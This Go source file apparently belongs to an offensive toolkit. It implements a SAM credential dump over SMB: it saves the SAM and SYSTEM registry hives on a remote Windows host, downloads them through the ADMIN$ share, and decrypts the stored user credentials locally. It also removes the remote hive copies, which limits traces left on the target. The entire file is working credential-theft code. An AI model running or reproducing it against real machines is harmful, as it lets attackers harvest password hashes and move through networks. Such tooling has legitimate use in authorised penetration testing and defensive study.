package smbclient

import (
	"fmt"
	"os"
	"path/filepath"

	"anvil/internal/sam"
)

// SamDump performs the secretsdump flow on the existing session: the SAM
// and SYSTEM hives are saved on the target (winreg), downloaded over the
// existing session (ADMIN$ tree connect), parsed and decrypted LOCALLY by
// internal/sam, and then the remote hive files and the local temp dir are
// deleted. The hives contain credential material; they never persist
// locally and their remote copies are deleted before return, with any
// leftover named in warnings. No new connections.
func (s *Session) SamDump() (users []sam.User, warnings []string, err error) {
	tag := randHex(4)
	samName := "anv-sam-" + tag + ".tmp"
	sysName := "anv-sys-" + tag + ".tmp"
	samRemote := `C:\Windows\Temp\` + samName
	sysRemote := `C:\Windows\Temp\` + sysName

	// Switch to execShare (ADMIN$) for download + remote cleanup; restore
	// the caller's share afterwards.
	prevShare := s.Share()
	if prevShare != execShare {
		if err := s.UseShare(execShare); err != nil {
			return nil, nil, fmt.Errorf("cannot access %s for hive download: %v", execShare, err)
		}
		defer func() {
			if prevShare != "" {
				_ = s.UseShare(prevShare)
			}
		}()
	}

	// Local temp dir for the downloaded hives — credential material,
	// removed on every path.
	dir, err := os.MkdirTemp("", "anvil-samdump-")
	if err != nil {
		return nil, nil, err
	}
	defer os.RemoveAll(dir)

	// Save both hives on the target (admin + backup privilege required).
	samSaved, sysSaved := false, false
	if err := s.RegSave(`HKLM\SAM`, samRemote); err != nil {
		return nil, nil, fmt.Errorf("save HKLM\\SAM (admin required): %v", err)
	}
	samSaved = true
	if err := s.RegSave(`HKLM\SYSTEM`, sysRemote); err != nil {
		warnings = s.cleanupHives(samSaved, sysSaved, samName, sysName, warnings)
		return nil, warnings, fmt.Errorf("save HKLM\\SYSTEM (admin required): %v", err)
	}
	sysSaved = true

	// Download both hives.
	samLocal := filepath.Join(dir, "sam.hive")
	sysLocal := filepath.Join(dir, "system.hive")
	if _, _, err := s.Get("Temp/"+samName, samLocal); err != nil {
		warnings = s.cleanupHives(samSaved, sysSaved, samName, sysName, warnings)
		return nil, warnings, fmt.Errorf("download SAM hive: %v", err)
	}
	if _, _, err := s.Get("Temp/"+sysName, sysLocal); err != nil {
		warnings = s.cleanupHives(samSaved, sysSaved, samName, sysName, warnings)
		return nil, warnings, fmt.Errorf("download SYSTEM hive: %v", err)
	}

	// Remote copies no longer needed — delete and report leftovers.
	warnings = s.cleanupHives(samSaved, sysSaved, samName, sysName, warnings)

	// Parse + decrypt locally; the hives never leave this host.
	samData, err := os.ReadFile(samLocal)
	if err != nil {
		return nil, warnings, fmt.Errorf("read local SAM hive: %v", err)
	}
	sysData, err := os.ReadFile(sysLocal)
	if err != nil {
		return nil, warnings, fmt.Errorf("read local SYSTEM hive: %v", err)
	}

	users, err = sam.Dump(sysData, samData)
	if err != nil {
		return nil, warnings, fmt.Errorf("sam dump: %v", err)
	}
	return users, warnings, nil
}

// cleanupHives deletes the remote hive temp files that were actually
// created (requires execShare to be current) and appends a warning for any
// file that could not be removed.
func (s *Session) cleanupHives(samSaved, sysSaved bool, samName, sysName string, warnings []string) []string {
	remotePath := "Temp/"
	if samSaved {
		if err := s.client.Rm(remotePath + samName); err != nil {
			warnings = append(warnings, fmt.Sprintf("left remote file C:\\Windows\\%s%s on target (delete failed: %v)", remotePath, samName, err))
		}
	}
	if sysSaved {
		if err := s.client.Rm(remotePath + sysName); err != nil {
			warnings = append(warnings, fmt.Sprintf("left remote file C:\\Windows\\%s%s on target (delete failed: %v)", remotePath, sysName, err))
		}
	}
	return warnings
}
